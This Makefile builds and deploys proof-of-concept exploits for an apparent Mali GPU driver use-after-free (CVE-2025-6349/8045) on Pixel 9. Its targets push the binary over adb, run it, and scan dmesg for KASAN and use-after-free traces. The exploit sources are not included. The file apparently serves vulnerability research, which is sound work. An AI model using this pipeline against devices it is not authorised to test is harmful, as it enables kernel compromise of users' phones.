CC = aarch64-linux-gnu-gcc
CFLAGS = -O2 -g -Wall -fPIC -static
LDFLAGS = -lpthread -lm -lrt

TARGET = mali_uaf_poc
TARGET_PIXEL9 = mali_pixel9_poc
TARGET_PIXEL9_NDK = mali_pixel9_poc_ndk
TARGET_STRATEGY3 = poc_strategy3
SOURCES = poc_cve_2025_6349_8045.c
SOURCES_PIXEL9 = poc_cve_pixel9.c
SOURCES_STRATEGY3 = poc_strategy3.c

NDK_HOME ?= $(HOME)/android-ndk-r27c
NDK_CC = $(NDK_HOME)/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android34-clang

all: $(TARGET) $(TARGET_PIXEL9) $(TARGET_STRATEGY3)

$(TARGET): $(SOURCES)
	@echo "[*] Building generic POC (static)..."
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

$(TARGET_PIXEL9): $(SOURCES_PIXEL9)
	@echo "[*] Building Pixel 9 POC (static, dlopen fallback)..."
	$(CC) $(CFLAGS) -o $@ $< -ldl -lpthread -lm -lrt

$(TARGET_STRATEGY3): $(SOURCES_STRATEGY3)
	@echo "[*] Building Strategy 3 POC (static)..."
	$(CC) $(CFLAGS) -o $@ $< -ldl -lpthread -lm -lrt

ndk: $(SOURCES_PIXEL9)
	@echo "[*] Building Pixel 9 POC with NDK (dynamic, recommended)..."
	$(NDK_CC) -O2 -g -Wall -o $(TARGET_PIXEL9_NDK) $< -ldl -lm -llog
	@echo "[*] Built: $(TARGET_PIXEL9_NDK) ($(shell du -h $(TARGET_PIXEL9_NDK) | cut -f1))"

clean:
	rm -f $(TARGET) $(TARGET_PIXEL9) $(TARGET_PIXEL9_NDK) $(TARGET_STRATEGY3) poc_strategy3_ndk

deploy: ndk
	@echo "[*] Deploying NDK POC to device..."
	adb push $(TARGET_PIXEL9_NDK) /data/local/tmp/
	adb shell chmod +x /data/local/tmp/$(TARGET_PIXEL9_NDK)

run: deploy
	@echo "[*] Running exploit..."
	adb shell /data/local/tmp/$(TARGET_PIXEL9_NDK) 3071

dmesg:
	@echo "[*] Checking dmesg..."
	adb shell dmesg | grep -iE "(kasan|use-after-free|double-free|slab|mali|kbase)" | tail -50 || echo "(no indicators)"

check-dmesg: dmesg

verify: deploy
	adb shell /data/local/tmp/$(TARGET_PIXEL9_NDK) || true
	@echo ""
	@echo "[*] Dmesg:"
	adb shell dmesg | tail -200 | grep -iE "(kasan|use-after-free|double-free|slab|mali|kbase)" || echo "(no indicators)"

.PHONY: all clean ndk deploy run dmesg check-dmesg verify
